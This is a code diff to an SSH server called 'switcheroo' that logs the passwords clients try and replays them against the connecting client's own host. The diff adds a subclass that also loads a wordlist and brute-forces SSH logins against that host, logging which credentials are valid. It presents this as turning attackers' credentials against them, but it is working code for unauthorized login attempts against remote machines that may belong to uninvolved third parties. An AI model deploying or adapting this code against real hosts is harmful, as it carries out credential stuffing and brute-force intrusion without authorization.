@@ -4,6 +4,7 @@ import logging
 import asyncssh
 
 from switcheroo import utils
+from switcheroo.config import Config
 
 logger = logging.getLogger("switcheroo")
 
@@ -61,14 +62,20 @@ class SwitcherooSSHServer(LoggingSSHServer):
     A credential logging and replaying SSH Server.
     """
 
-    async def switcheroo(self, username, password):
+    async def check_credentials(self, username, password):
+        try:
+            async with asyncssh.connect(self.host, username=username, password=password, known_hosts=None):
+                return True
+        except Exception:
+            pass
+        return False
+
+    async def replay(self, username, password):
         """
         Use the attacker's credentials against himself.
         """
         try:
-            async with asyncssh.connect(
-                self.host, username=username, password=password, known_hosts=None
-            ):
+            if await self.check_credentials(username, password):
                 logger.info(
                     "auth='password' host=%r username=%r password=%r valid=true",
                     f"{self.host}:{self.port}",
@@ -86,4 +93,34 @@ class SwitcherooSSHServer(LoggingSSHServer):
         return False
 
     def validate_password(self, username, password):
-        return asyncio.wait_for(self.switcheroo(username, password), timeout=4.0)
+        return asyncio.wait_for(self.replay(username, password), timeout=4.0)
+
+
+class SwitcherooBruteSSHServer(SwitcherooSSHServer):
+    """
+    A credential logging and bruteforce SSH Server.
+    """
+
+    async def attack(self, username, password):
+        credentials = [(username, password)]
+        more_creds = Config.load_wordlist()
+        if more_creds:
+            credentials.extend(more_creds)
+        for username, password in credentials:
+            if await self.check_credentials(username, password):
+                logger.info(
+                    "auth='password' host=%r username=%r password=%r valid=true",
+                    f"{self.host}:{self.port}",
+                    username,
+                    password,
+                )
+                return False
+            logger.info(
+                "auth='password' host=%r username=%r password=%r valid=false",
+                f"{self.host}:{self.port}",
+                username,
+                password,
+            )
+
+    def validate_password(self, username, password):
+        return asyncio.wait_for(self.attack(username, password), timeout=4.0)
